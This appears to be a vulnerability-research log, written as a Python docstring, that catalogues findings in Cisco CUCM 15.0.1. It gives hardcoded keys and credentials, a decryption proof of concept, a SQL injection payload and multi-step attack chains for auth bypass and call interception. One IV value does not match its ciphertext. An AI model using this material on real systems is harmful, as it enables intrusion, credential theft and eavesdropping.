"""
cisco_cucm_re.py — Cisco CUCM 15.0.1 reverse engineering module

Target: Cisco Unified Communications Manager (CUCM) 15.0.1.11901-2
Platform: AlmaLinux 8, Informix DB, Apache Tomcat, OpenSAML SSO SP
ISO: UCSInstall_UCOS_15.0.1.11901-2.sha512.iso
RE date: 2026-08-27
Method: Static analysis of ISO-mounted RPM contents

=== ARCHITECTURE ===

  +--------------------------------------------------+
  | AlmaLinux 8 (base OS)                            |
  |   Platform: /usr/local/platform/                 |
  |   CM: /usr/local/cm/                             |
  +--------------------------------------------------+
       ↓
  +--------------------------------------------------+
  | Apache Tomcat (jakarta-tomcat)                   |
  |   /axl/                 → AXL SOAP API (cm-axl)  |
  |   /platformcom/         → Platform COM API        |
  |   /platform-services/   → Platform services       |
  |   Axis2 bundled in axl.war                       |
  +--------------------------------------------------+
       ↓
  +--------------------------------------------------+
  | Informix DB (IDS, licensed, /usr/local/cm/db/)  |
  |   ccm_db: all CUCM config (phones, users, routes)|
  |   DB user: ccmuser / ccmuser (ALL PRIVILEGES)    |
  |   DB user: dbaxlweb (AXL API queries)            |
  |   Replication via IDS CDR                        |
  +--------------------------------------------------+
       ↓
  +--------------------------------------------------+
  | CAPF (/usr/local/cm/bin/capf)                   |
  |   CA for IP phone identity certs (SCEP/PKCS#10)  |
  |   CA creds at /usr/local/cm/.security/CAPF/      |
  |   Encrypted with CCMShellEncryptionUtil -d        |
  +--------------------------------------------------+
       ↓
  +--------------------------------------------------+
  | SSO SP (sso-sp RPM)                              |
  |   OpenSAML 2.6.5 (EOL 2017)                     |
  |   Nimbus JOSE+JWT 4.23 (2016, pre-5.x)          |
  |   samlauthvalve.jar: SAML → Tomcat Principal     |
  |   ssobackend.jar: token issuance + validation    |
  +--------------------------------------------------+

=== FINDINGS SUMMARY ===

CUCM-F1 CRITICAL: Axis2 admin:axis2 hardcoded + hot-deploy → RCE
  File: axl.war → WEB-INF/conf/axis2.xml
  POST /axl/axis2-admin/upload Authorization: Basic admin:axis2 (default)
  hotdeployment=true → .aar or .class hot-load in Tomcat JVM
  Auth filter maps to <url-pattern>/</url-pattern>; /axis2-admin/* may bypass
  Runtime verification needed: does AuthenticationFilter apply to /axis2-admin/?

CUCM-F2 HIGH: platformcom BasicAuthentication localhost bypass
  File: platformcom.war → BasicAuthentication.class
  Bytecode: remoteAddr.equals("127.0.0.1") OR "::1" → skip auth
  Protected endpoints bypass for loopback:
    /api/v1/software/install/*, /api/v1/cluster/software/upgrade/*
    /api/v1/software/reboot/*, /api/v1/certmgr/config/certificate/store
  Unprotected (no filter-mapping): /api/v1/certmgr/config/snapshot/*
  Chain: any SSRF from CUCM host → unauthenticated cluster software/cert control

CUCM-F3 CRITICAL: Hardcoded AES-128 static key in CCMShellEncryptionUtil
  File: cm-ccm/usr/local/cm/bin/CCMShellEncryptionUtil
  BuildID: cfbbb0a3a58cf2b701f335a9ee1fea55cc1f1ab8; ELF PIE, NOT stripped
  nm: 000000000020f308 D _ZN20CCMEncryptionLibrary10_staticKeyE  (D = initialized .data)
  Pointer at 0x20f308 → VA 0xc111 → string: "smetsysocsiccni\x00" (16 bytes)
  Key = "incciscosystems" reversed → Cisco company name backwards
  AES-128-CBC; used as fallback when /usr/local/platform/.security/CCMEncryption/keys/dkey.txt missing
  Decrypts: CAPF CACredentials.txt, ifx.txt (Informix pw), SftpPwCrypt in platformConfig.xml
  POC: from Crypto.Cipher import AES; AES.new(b'smetsysocsiccni\x00', AES.MODE_CBC, iv).decrypt(ct)
  Impact: ANY filesystem read on ANY CUCM 15.0.1 → decrypt all credentials → CAPF CA key compromise
          → forge phone identity certs for all extensions → SRTP call interception at scale

CUCM-F4 HIGH: ccmuser:ccmuser hardcoded Informix DB credential
  File: cm-dbl/usr/local/cm/db/sql/ccmusers.sql line 5
  "create user ccmuser with encrypted password 'ccmuser' in group ccmusers;"
  Group ccmusers: ALL PRIVILEGES on every CUCM table
  TCP:1526 (Informix) → ccmuser:ccmuser → full DB dump

CUCM-F5 CRITICAL: passwordreverse default = AES-CBC(static_key, empty_string) → SIP auth bypass
  File: makedb.sql lines 2016 + 6159 + CCMMigrateUtil analysis
  DEFAULT '69c4f936f9cdf45f6bbca2570c31215629bb5d6fb97493478b8ff3db6fffbc55'
  DECRYPTED (using CUCM-F3 static key, confirmed 2026-08-27):
    ct format: IV(16)|AES-CBC(plaintext)
    plaintext = b'' (EMPTY STRING — 16 bytes PKCS7 padding, Match=True)
  Impact: SIP Auth Bypass on all siprealm/applicationuser entries with default passwordreverse
    HA1 = SHA-256(username:realm:'') is trivially computable → unauthorized SIP registration
    Call routing manipulation, trunk spoofing, SIP identity spoofing

CUCM-F6 MEDIUM: Nimbus JOSE+JWT 4.23 (2016) in SSO SP — alg:none risk
  File: sso-sp → nimbus-jose-jwt.jar Bundle-Version: 4.23.0
  Pre-5.x Nimbus: potential PlainJWT acceptance where SignedJWT expected
  alg:none JWT → arbitrary user impersonation in SSO flow
  Pending: ssobackend.jar JWT validation bytecode review

CUCM-F7 CRITICAL: OpenSAML 2.6.5 XSW + SAMLAuthValve always-true auth bypass
  File: sso-sp → opensaml.jar (2.6.5, EOL 2017) + samlauthvalve.jar
  OpenSAML 2.6.5: DOM-based XML signature validation — XSW-1/2 attacks inject unsigned NameID
  SAMLAuthValve.authenticate() bytecode (confirmed):
    - Reads org.apache.catalina.session.USERNAME from session
    - Calls Realm.authenticate(user, "") with EMPTY PASSWORD (constant pool #28 = "")
    - Calls register() then returns TRUE regardless of Realm result (even null principal)
    - iconst_1 at offset 245 — always returns true when username non-null
  Chain: XSW → forged session USERNAME → SAMLAuthValve TRUE → CUCM admin session
  CVSS: 9.1 Critical AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:L

CUCM-F8 LOW: log4j 1.x (slf4j-log4j12-1.6.1) — JMSAppender CVE-2019-17571
  File: sso-sp → slf4j-log4j12-1.6.1.jar
  JMSAppender requires attacker config control; low standalone severity

CUCM-F9 INFO: dbaxlweb DB username exposed in AXL bytecode
  File: axl.war → AXLAlpha.class string "dbaxlweb"
  Password split: /partB/usr/local/cm/db/ifx.txt encrypted with CCMShellEncryptionUtil static key

CUCM-F10 CRITICAL: SAMLAuthValve.authenticate() returns TRUE regardless of Realm result
  File: sso-sp/samlauthvalve.jar → SAMLAuthValve.class
  Bytecode: iconst_1;ireturn at offset 245 — no null-principal guard before return
  ANY mechanism setting session USERNAME → unconditional TRUE from SAMLAuthValve
  Combined with F7 XSW: unauthenticated admin access

CUCM-F11 HIGH: SAFClientControl inter-cluster passwords decryptable via static key fallback
  File: cm-ccm binary → SAFClientControl::getDecryptedPwd() at VA 0x14e0a90
  Disassembly (2026-08-27):
    call CCMEncryption::CCMEncryption()              // ResetKey → current key
    call CCMEncryption::hexToPassword()              // hex-decode encrypted SAF pw
    call CCMEncryption::DecryptText()                // decrypt
    → on failure: fallback at 0x23da083 calls staticKey() + SetKey(staticKey)
    → retries AES-128-CBC with "smetsysocsiccni\x00"
  SAF credentials in CCMDB_SAFCLIENTSETTINGS.password → inter-cluster trust
  Static key fallback = SAF passwords always extractable from DB dump + static key

=== CCMEncryptionLibrary::Key() fully mapped (2026-08-27) ===
  VA 0x23dba2a in main ccm binary:
  if (dKeyConfig == 0 OR dKeyConfig == 2):
      return _staticKey  → "smetsysocsiccni\x00"  // fresh install = ALWAYS static
  else:
      fopen dkey.txt → fread(64 hex chars) → hexToBytes → _currentKey (32B AES-256)
      return _currentKey
  DecryptText fallback: after all dynamic key attempts → staticKey() → SetKey(staticKey) → retry
  Consequence: static key ALWAYS decrypts any credential encrypted before dkey migration

CUCM-F12 HIGH: pktCap "file" parameter → passphrase disclosure
  File: cm-ccm/pktCap.war → pktCap_jsp.class, offset 421-586
  GET /pktCap?file=.pktCap.passphrase → FileInputStream("/var/pktCap/.pktCap.passphrase")
  Only "/" blocked in file param; hidden files (no "/" in name) served directly
  DES3 passphrase used by pktCap_protectData openssl cmd: -pass file:/var/pktCap/.pktCap.passphrase
  Confirmed: pktCap_protectData strings include full openssl des3 command template with passphrase path
  Requires: "Standard Packet Sniffer Users" role
  Impact: download passphrase → decrypt ALL /var/pktCap/*.pkt captures offline

CUCM-F13 MEDIUM: pktCap second-order SQLi via remoteUser
  File: cm-ccm/pktCap.war → pktCap_jsp.class, offset 162-215
  String sql = "...where u.userid='" + request.getRemoteUser() + "' and g.name='Standard Packet Sniffer Users'..."
  CCMRealm sanitizes ' → '' and \ → \\ ONLY; all other metacharacters unsanitized
  Second-order: username from LDAP sync stored unsanitized in enduser.userid → injected into SQL at auth-check time
  FastAccess → Informix → authorization bypass if injection succeeds

CUCM-F14 LOW: pktCap key argument injection into pktCap_protectData
  File: cm-ccm/pktCap.war → pktCap_jsp.class, offset 763-776 + pktCap_protectData binary
  Runtime.exec(String) tokenizes on whitespace → spaces in key param inject extra args
  Binary option string: "epdo:i:k:" (getopt_long); flags e/p/d/o/i/k parsed
  Binary defense: checkForHarmfulMetaChars() blocks $, ;, |, `, (, ), <, >, \, /
  checkFileName() validates -i arg must == "/var/pktCap/.fileinfo" exactly
  Impact: mode-flag injection (e.g. -d for decrypt, -e for encrypt) — no shell injection

CUCM-F15 LOW: pktCap BASIC auth over cleartext HTTP
  File: cm-ccm/pktCap.war → WEB-INF/web.xml
  <transport-guarantee>NONE</transport-guarantee> + <auth-method>BASIC</auth-method>
  Credentials transmitted as base64 without TLS on port 8080
  Chain: on-path sniff pktCap credentials → download .pktCap.passphrase (F12) → decrypt captures

CUCM-F16 HIGH: Phone device cert CN validated via strstr substring match — device identity spoofing
  File: cm-ccm/var/log/active/cm/bin/ccm
  CheckDeviceIDinX509Certificate at VA 0x1c92310:
    1c9236c: call strstr(certCN, deviceID_truncated)  ; SUBSTRING, not strcmp
    1c92374: setne %al  ; 1=match(pass), 0=nomatch(reject)
  Device ID truncated to 16 bytes before comparison (mov $0x10,%edx at 0x1c92351)
  Only caller: UnicastBridgeControl::wait_register_StationRegister at VA 0x1934db2
    → 0x1934dca: jne 0x1934f70  ; match → ValidateCipher(3) → proceed to registration
    → else: StationOutputRegisterRejectC1; log "missmatch in devcie name and X509 Name in certificate"
  Attack: cert with CN containing victim device ID as substring passes check
    e.g., certCN="EVIL-SEP001122334455" → strstr(certCN,"SEP001122334455") = non-null → PASS
  Chain with F3: static AES key → decrypt CAPF CA key → forge cert with embedded victim device ID
    → register as victim phone → steal registration, intercept calls, SRTP session takeover
  CVSS: 8.1 High AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N

CUCM-F20 LOW: Development JDBC credential in dbl2j.jar TimedPingPrimary.main() — shipped in production
  File: cm-dbl/dbl2j.jar → com.cisco.ccm.dbl.TimedPingPrimary.main()
  Bytecode offset 46 (ldc #63): "jdbc:informix-sqli://nw096a-93:1500/ccm0500v0001:informixserver=nw096a_93_ccm;user=dbuser;password=42lj5i"
  Only in main() test entry point — Cisco internal dev environment (CUCM 5.0 era)
  Non-production credential; confirms dbuser username; reveals internal Cisco infrastructure names
  CVSS: LOW — test credential for long-gone internal Cisco host

CUCM-F22 MEDIUM: IMS LDAP/LDAPS TLS hostname verification disabled — Active Directory MITM
  File: cm-authentication/IMS.jar → com.cisco.security.ims.impl.AuthenticationLDAP.makeConnection()
  Bytecode evidence (constant pool):
    #54 = String // com.sun.jndi.ldap.object.disableEndpointIdentification
    #55 = String // com.sun.jndi.ldap.object.disableEndpointIdentification  (set twice in SSL path)
    #59 = String // ssl  (java.naming.security.protocol value)
    #60 = String // java.naming.ldap.factory.socket
    #61 = Class  // com/cisco/security/ims/impl/CustomSocketFactory
  Config evidence (cm-dirsync/CCMDirSyncCfg.xml):
    <VmParam Param="-Dcom.sun.jndi.ldap.object.disableEndpointIdentification=true" />
  CustomSocketFactory amplification:
    createSocket(String host, int port) → null  (parametrized overloads all return null)
    createSocket(InetAddress, int, InetAddress, int) → null
    createSocket(String, int, InetAddress, int) → null
    Only createSocket() (no-arg) works — LDAPS connections using this factory fail unless JVM fallback occurs
  Attack chain:
    on-path attacker between CUCM and AD (TCP/636) → intercept LDAPS connection
    → present any cert from a CUCM-trusted CA for ANY hostname (hostname check disabled)
    → TLS session established with attacker endpoint → receive LDAP BIND with plaintext DN + password
    → same impact as F21 but via network interception vs static key decryption
  Combined chain (F3 → F21 → F22):
    F21: static key decrypts stored ciphertext → plaintext bind password obtained offline
    F22: hostname check disabled → MITM intercepts bind credential in transit
    Both converge to full AD enumeration
  Distinction from F17 (platform-api trust-all):
    F22 does NOT use trust-all TrustManager — system truststore IS validated
    Attack bar: obtain a cert from ANY CUCM-trusted CA for ANY hostname (not forge a self-signed cert)
    Enterprise CUCM commonly ships with internal CA certs → internal CA operator = attacker threshold
  CVSS: 6.5 Medium AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N

CUCM-F21 HIGH: LDAP Manager bind password decryptable via F3 static AES key — Active Directory access
  File: cm-ccm binary → authenticationLDAPConfig::readLDAPServerDetailsFromDB() at VA 0x2331746
  Disassembly — CCMEncryption call chain:
    0x2331e47: call CCMEncryptionC1()      ; construct CCMEncryption (uses F3 static key fallback)
    0x2331eb2: call hexToPassword()        ; hex-decode ciphertext from ldapauthentication.ldappassword
    0x2331f2c: call DecryptText()          ; AES-CBC decrypt → plaintext LDAP Manager bind password
    0x2331f47: movq $0x0,0x418(%r12)       ; reset pConfig.ldapManagerPW before store
  DB schema: cm-dbl/makedb.sql
    ldapauthentication.ldappassword LVARCHAR(401) DEFAULT '' NOT NULL
  Default ciphertext (typefieldinfo DirectoryPluginConfig.LdapPassword):
    9e1cb76005b4b718276f4f3662d11f4474dbf844c91298f70fa00d71a9151211
  Decryption (confirmed Python 2026-08-27):
    KEY = b'smetsysocsiccni\x00'  (F3 static key)
    IV  = 9e1cb76005b4b718276f4f4662d11f44  (first 16 bytes)
    PT  = b''  (empty string — same as F5 passwordreverse pattern)
    Re-encrypt match: True
  Attack chain:
    F4 (ccmuser:ccmuser) → SELECT ldapdn,ldappassword FROM ldapauthentication
    F3 static key → AES_128_CBC_decrypt(ldappassword) → plaintext bind password
    ldap_simple_bind_s(ldap_server, ldapdn, plaintext_pw) → full AD enumeration
    Default case: empty pw → anonymous LDAP bind may succeed on many AD servers
  Note: F21 is the direct impact path from F3 to enterprise Active Directory.
  Enterprise CUCM deployments use LDAP integration universally → near-universal applicability.
  CVSS: 8.6 High AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N (scoped: C:H because reads entire AD tree)

CUCM-F19 HIGH: platform-services.war Axis2 admin UI exposed without auth (admin:axis2, hotdeployment=true)
  File: platform-api/platform-services.war → WEB-INF/conf/axis2.xml + WEB-INF/web.xml
  axis2.xml: userName=admin, password=axis2, hotdeployment=true (confirmed)
  web.xml: security-constraint covers /services/* ONLY; axis2-web/ NOT covered
  AxisAdminServlet defined but NO servlet-mapping → hot-deploy via upload.jsp currently blocked
  Accessible without auth: admin.jsp, Login.jsp, upload.jsp, listServices.jsp, HappyAxis.jsp
  If AxisAdminServlet mapping added → CRITICAL (same as F1 but different WAR/endpoint)
  Pattern identical to F1 (axl.war) with same admin:axis2 default credential
  CVSS: 8.1 High AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H

CUCM-F18 MEDIUM: AXL SQL Toolkit trust-all TrustManager + JVM-global HostnameVerifier bypass
  File: cm-axlsqltoolkit/axlsqltoolkit.zip → src/AxlSqlToolkit.java (SOURCE INCLUDED)
  MyTrustManager inner class (lines 281-288):
    checkClientTrusted(): empty; checkServerTrusted(): empty; getAcceptedIssuers(): null
  init() sets JVM-global bypass:
    HttpsURLConnection.setDefaultSSLSocketFactory(sf)                   <- ALL HTTPS in JVM
    HttpsURLConnection.setDefaultHostnameVerifier(() -> return true)    <- always-true, JVM-global
  Endpoint: https://host:8443/axl/ — Basic Auth credentials interceptable via MITM
  Impact: AXL credentials have executeSQLQuery/executeSQLUpdate → full DB dump
  Same pattern as ASA/ASDM F8 (efw JVM-global SSL bypass); distinction: CLI tool vs persistent service
  CVSS: 6.8 Medium AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:N

CUCM-F17 HIGH: Platform API SOAP client trust-all X509TrustManager — inter-cluster cert/key MITM
  File: platform-api.jar → com.cisco.vos.platform.api.soapclient.SSLProtocolSocketFactory$1
  Anonymous inner class implements javax.net.ssl.X509TrustManager:
    checkClientTrusted(X509Certificate[], String): Code 0: return  <- empty, no validation
    checkServerTrusted(X509Certificate[], String): Code 0: return  <- empty, no validation
    getAcceptedIssuers(): Code 0: aconst_null; 1: areturn          <- null (accepts all)
  SSLProtocolSocketFactory.getTrustManager() returns this trust-all instance
  SSLContext.init(null, getTrustManager(), null) — all HTTPS SOAP connections unvalidated
  Affected clients: CertificateCsrAndDataExportServiceClient, APIVersionServiceClient
  Impact: on-path attacker on cluster mgmt network → MITM SOAP → intercept private key exports
  Pattern identical to ASA/ASDM F6 (class av trust-all TrustManager)
  CVSS: 7.4 High AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N

CUCM-F23 MEDIUM: CiscoRA EST Proof of Possession disabled — phone cert enrollment without key ownership
  File: cm-security/usr/local/thirdparty/nginx/install/conf/nginx.conf
  Config: est_pop off;   (RFC 7030 §4.2 requires PoP for non-EAP enrollments)
  Attack: capture phone CSR during simpleenroll request → re-submit without possessing private key
          → CA issues cert bound to phone identity without proof of key ownership
  Amplification: F24 NTLM relay controls which CSR gets approved → full phone identity manufacturing
  CVSS: 5.9 Medium AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:H/A:N

CUCM-F24 MEDIUM: CiscoRA EST NTLM auth relay to Windows CA — phone cert issuance via NTLM relay
  File: cm-security/usr/local/thirdparty/nginx/install/conf/nginx.conf
  Config:
    est_certsrv_auth_method NTLM;
    est_certsrv_ca_auth_method NTLM;
    est_certsrv_auth_server WIN-EJSG9DN4GS6;
    est_certsrv_auth_html_check off;    (removes HTML response integrity check)
    est_certsrv_ca_html_check off;
  Attack: intercept CiscoRA outbound NTLM auth to Windows CA (HTTPS:443) → relay NTLM credential
          → authenticate as CiscoRA service account → approve arbitrary CSRs via Windows CA API
  With F23 (PoP disabled): attacker can both intercept CSRs AND relay CA auth → full identity manufacturing
  CVSS: 6.5 Medium AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:H/A:N

CUCM-F25 LOW: Hardcoded development hostname WIN-EJSG9DN4GS6 in production CiscoRA nginx.conf
  File: cm-security/usr/local/thirdparty/nginx/install/conf/nginx.conf
  Config: est_certsrv_auth_server WIN-EJSG9DN4GS6; est_certsrv_server WIN-EJSG9DN4GS6;
          est_trusted_certs .../CAPF/certs/WIN-EJSG9DN4GS6.pem (lab CA cert ships with ISO)
  Impact: lab CA cert distributed to all CUCM 15.0.1 → anyone with lab CA key can be trusted by CiscoRA
          EST enrollment non-functional in customer environments (silent config failure)

CUCM-F26 INFO: Developer GDB extension spy.py ships in production ISO
  File: cm-ccm/common/spy.py
  Content: "Stephen's GDB Python Helper (SPY)"; IMDB = "CCMDB"
  Exposes: internal DB name (corroborates F4/F9), CUCM data structure internals, named developer
  Impact: informational — confirms CCMDB name, assists binary RE, developer identity for social engineering

CUCM-F27 MEDIUM: SAML SP AuthnRequests unsigned by default — forged IdP redirects
  File: sso-sp/usr/local/platform/sso/saml/conf/ssoconfig.properties line 56
  Config: metadata_auth_request_signed=false
  Bytecode (SPMetadataController constructor):
    offset 124-134: METADATA_AUTH_REQUEST_SIGNED = ssoCP.getPropertyValue("metadata_auth_request_signed") → "false"
    offset 232-238: setAuthnRequestsSigned(Boolean.valueOf("false")) → false
  Impact: IdP cannot verify AuthnRequest origin; combined with F7 XSW + F10 always-true → forged
    AuthnRequest → forged SAML response → unconditional admin auth bypass
  CVSS: 5.3 Medium AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:H/A:N

CUCM-F28 LOW: SAML SP metadata and assertion signing disabled — SP spoofing surface
  File: sso-sp/usr/local/platform/sso/saml/conf/ssoconfig.properties lines 57, 63
  Config: metadata_assertion_signed=false; sp_md_signed=false
  Impact: SP metadata (sp.xml) unsigned → IdP cannot verify metadata integrity; substituted metadata
    → IdP routes SAML responses to attacker ACS. Requires admin/filesystem write access. Amplifies F7/F10.

CUCM-F29 MEDIUM: CCMAsymmetricEncryption uses RSA/ECB/PKCS1PADDING (PKCS#1 v1.5, deprecated)
  File: cm-asymencryption/com/cisco/ccm/security/CCMAsymmetricEncryption.class
  Constant pool #9: "RSA/ECB/PKCS1PADDING"
  Bytecode: rsaAsymPubEnc() uses PKCS1 at offset 12 (FIPS/BCFIPS path) and offset 77 (non-FIPS)
  Local var rsaOAEPEncrypter (slot 3) stores PKCS1 Cipher — OAEP migration started but never completed
  NIST SP 800-131A Rev2: PKCS#1 v1.5 encryption disallowed after 2023; Bleichenbacher oracle susceptibility
  Affected: CAPF phone cert enrollment, inter-cluster token encryption, OAuth token RSA wrapping
  CVSS: 5.9 Medium AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N

CUCM-F30 MEDIUM: CallManager RSA private key passphrase stored in plaintext at predictable path
  File: cm-security/libCryptoUtil.so → CreatePrivateKeyPassPhraseInLocalStore() at 0x1772
  Path: /usr/local/cm/.security/CallManager/keys/CallManager.passphrase
  CreatePrivateKeyPassPhraseInLocalStore(): fopen("w") → GetRandonPassPhrase(10 bytes) → fwrite() (NO encrypt)
  GetPrivateKeyPassPhraseFromLocalStore(): fopen("r") → fread() byte-by-byte (NO decrypt) → raw return
  GetRandonPassPhrase(): RAND_bytes(10) → 56-char alphabet [A-x] → 57.5 bits entropy
  Contrast: CAPF creds use CCMShellEncryptionUtil AES-CBC; CallManager passphrase has no encryption layer
  Chain: any file-read exploit → CallManager.passphrase → decrypt CallManager_priv.pem → SRTP MITM
  CVSS: 5.5 Medium AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N

CUCM-F31 CRITICAL: F3 static key decrypts Windows CA service account credentials + FIPS SSM PIN
  File: cm-capf/usr/local/bin/base_scripts/EnrollmentService.sh
  Sources:
    CACredentials.txt L1: AES-CBC(F3_key, CA_service_account_username)
    CACredentials.txt L2: AES-CBC(F3_key, CA_service_account_password)  ← Windows domain creds
    TAM_PWD_FILE L1:      AES-CBC(F3_key, ssm_pin)                      ← FIPS module unlock PIN
  Decryption: sudo CCMShellEncryptionUtil -d $CA_UserName_Encrypted → plaintext Windows domain user
              sudo CCMShellEncryptionUtil -d $CA_Pwd_Encrypted       → plaintext Windows domain password
              sudo CCMShellEncryptionUtil -d $TAM_Pwd_Encrypted      → plaintext FIPS SSM PIN
  Written to ciscoRA_config_file: msca-user-id, msca-password, ssm-pin (plaintext, deleted after nginx reads)
  Chain:
    F3 key → decrypt CACredentials.txt → Windows CA domain user:password
    → authenticate to ADCS → issue certs for any SIP extension → forge phone identity
    → lateral movement: CA service accounts often have elevated AD privileges
    F3 key → decrypt TAM_PWD_FILE → FIPS SSM PIN → unlock BCFIPS module → recover CAPF CA key
  Scope: all CUCM deployments with Online CA mode (CAPFCertGenMethod=4, ONLINE_CA_TYPE=2) + Windows ADCS
  CVSS: 9.1 Critical AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H

CUCM-F33 CRITICAL: Hardcoded OpenAM encryption password in FederationConfig.properties
  File: sso_sp/usr/local/platform/sso/saml/metadata/FederationConfig.properties
  Key: am.encryption.pwd=8p3BTg2tvtG0Kg//Hqahy8x29u9FPxH2  (same across ALL CUCM installations)
  Decoder: com.sun.identity.saml.xmlsig.passwordDecoder=com.sun.identity.fedlet.FedletEncodeDecode
  Affected secrets:
    storepass: /usr/local/platform/.security/tomcat/keys/tomcat.passphrase (SAML JKS password)
    keypass:   /usr/local/platform/.security/tomcat/keys/tomcat.passphrase (SAML signing key password)
  Chain:
    am.encryption.pwd → FedletEncodeDecode.decode(tomcat.passphrase) → JKS password
    → unlock tomcat.keystore → extract SAML SP signing private key
    → forge SAML assertions for any user → authenticate as admin
    → also: unlock Tomcat HTTPS private key → TLS MITM all CUCM web interfaces
  Context: F3 covers CCMEncryption (CallManager subsystem); F33 covers OpenAM/Fedlet (SSO subsystem)
    Two independent hardcoded keys across two orthogonal credential stores
  CVSS: 9.1 Critical AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N (key is public from ISO; no auth needed)

CUCM-F32 CRITICAL: F3 static key decrypts OAuth JWT signing + encryption keys in authzkeys DB table
  File: ims/com/cisco/security/ims/authentication/GetAuthzKeys.class
  SQL: select keyid, keyvalue, tkpurpose from authzkeys
  tkpurpose=1: symmetric AES token encryption key → CCMEncryption.decryptPassword() → base64 decode → TokenKeys.symmetricKey
  tkpurpose=2: RSA signing private key → CCMEncryption.decryptPassword() → readPrivateKey() → TokenKeys.verificationKey
  decryptKey() bytecode: new CCMEncryption; hexToByte(encryptedHex); decryptPassword([B)
  Same CCMEncryption class as F3 (static key smetsysocsiccni)
  Key paths: authz_priv.pem, authz_symmetric_Key → /usr/local/platform/.security/authz/keys/
  Chain:
    F3 key → CCMEncryption.decryptPassword(authzkeys.keyvalue)
    → plaintext RSA signing private key
    → forge JWT: header.payload.RS256_sign(priv_key)
    → Authorization: Bearer <forged_token>
    → BearerAuthenticationRequestHandler.authenticate() → AuthenticationImpl.validateAccessToken()
    → authenticated as any CUCM user (admin, operator, or end user)
  Access vector: read authzkeys table via F4 (ccmuser:ccmuser Informix) or F1 RCE filesystem read
  Downstream: all OAuth-protected CUCM REST APIs, Jabber SSO, Webex integration, UCCX agent sessions
  CVSS: 9.1 Critical AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:N

CUCM-F34 HIGH: F3 static key decrypts full credential estate — LDAP bind + phone SSH + DirSync + UDS + CAPF binary
  Components: BPS/PhoneDBManager, IMS/AuthenticationLDAP, DirSync/DSLDAPSyncImpl, cucm-uds/LdapUtilities,
              cucm-uds/UcServiceProfileDetailXMLService
  Affected credential tables/columns:
    ldapauthentication.ldappassword      → IMS AuthenticationLDAP → AD/LDAP bind credential
    directorypluginconfig.ldappassword   → DirSync DSLDAPSyncImpl → directory sync LDAP bind
    device.sshpassword                   → BPS PhoneDBManager / RDPDBManager → IP phone SSH passwords
    authzkeys.keyvalue                   → IMS GetAuthzKeys → OAuth JWT keys (see F32)
    UcServiceProfileDetail XML <Password>→ cucm-uds/UcServiceProfileDetailXMLService → user profile pwds
    UDS outbound LDAP                    → cucm-uds/LdapUtilities → UDS LDAP bind credential
  Binary confirmations (smetsysocsiccni in .rodata, confirmed 2026-08-27):
    CCMShellEncryptionUtil, CCMEncryptionTest, capf, CTIManager, ccm (core CallManager)
  CVSS: 8.8 High AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N

CUCM-F35 CRITICAL: RCE → plaintext passphrase → CTL file forge → full phone estate MitM
  Binary: /usr/local/cm/bin/CTLCli (ELF64, debug symbols, not stripped)
  Functions confirmed: PEM_read_bio_RSAPrivateKey, RSASign, RSASignException
  File paths: /usr/local/cm/tftp/CTLFile.tlv (deployed), /usr/local/cm/tftp/CTLFile_old.tlv (backup)
  Passphrase source (F30): /usr/local/cm/.security/CallManager/keys/CallManager.passphrase → plaintext
  Chain:
    F1 Axis2 RCE → read CallManager.passphrase (plaintext, F30)
    → PEM_read_bio_RSAPrivateKey(CallManager_priv.pem, passphrase) → CM signing key
    → inject attacker cert into CTLFile.tlv → sign with CM key via CTLCli/RSASign
    → deploy to /usr/local/cm/tftp/CTLFile.tlv (TFTP auto-serves, no auth)
    → AXL DoDeviceReset → all phones reboot → fetch forged CTL
    → phones trust attacker SAST cert → MitM all SRTP/TLS traffic → voice recording
  updateCTLFile.sh: echo "y" | /usr/local/cm/bin/ctl_cli.sh 3 (unattended CTL reset automation)
  CVSS: 9.9 Critical AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H

CUCM-F36 LOW: Decrypted credential logging in CCM trace logs
  Binary: /var/log/active/cm/bin/ccm (strings confirmed 2026-08-27)
  Sites:
    SIPSecurity: "decrypt hex password = \"%s\" , ecnrypted len %d" → plaintext SIP auth password logged
    SAF profile: "password............... %s" → SAF connection password in diagnostic dump
    HttpNPConnection: "userName=%s, password=%s" → HTTP service credentials in request log
  Access: RTMT log collection available to 'Standard CCM Admin Users' role (lower privilege than full admin)
  Impact: lateral movement via SAF inter-cluster passwords; SIP device password recovery → rogue registration
  CVSS: 3.5 Low AV:L/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N

CUCM-F37 HIGH: Pre-Auth SQL Injection in ccmivr IVR via ccmusername PreparedStatement bypass (HTTP-accessible)
  Component: cm-ccmivr/usr/local/cm/war/ccmivr.war
             IVRDBInterface.getRemoteDestinationListFromCcmusername()
  Root cause: SQL built via StringBuilder.append(ccmusername) BEFORE prepareStatement() call.
              No ? placeholders; no setString() calls. PreparedStatement provides zero protection.
  Validator: CcmivrValidator.IsUserNameValid() regex ^[a-zA-Z0-9$_@.&!*\"\'(),%-]+$ — allows single quote '
  Auth: web.xml security-constraint uses <http-method-omission> for GET and POST →
        GET and POST endpoints are UNRESTRICTED (no HTTP auth required)
  Bytecode evidence (IVRDBInterface.class, getRemoteDestinationListFromCcmusername):
    55: ldc #104  "select ... where e.userid = '"
    61: invokevirtual #14  StringBuilder.append(ccmusername)  ← user input
    64: ldc #105  "' and rdd.fkremotedestination = ..."
    155: invokevirtual #51  Connector.prepareStatement(String, int, int)  ← concatenated SQL, no placeholders
    162: invokeinterface #52  PreparedStatement.executeQuery()
  Attack: ccmusername=x' UNION SELECT password FROM enduser WHERE userid='admin
  Amplifier: F3 static key decrypts any returned encrypted passwords from enduser table
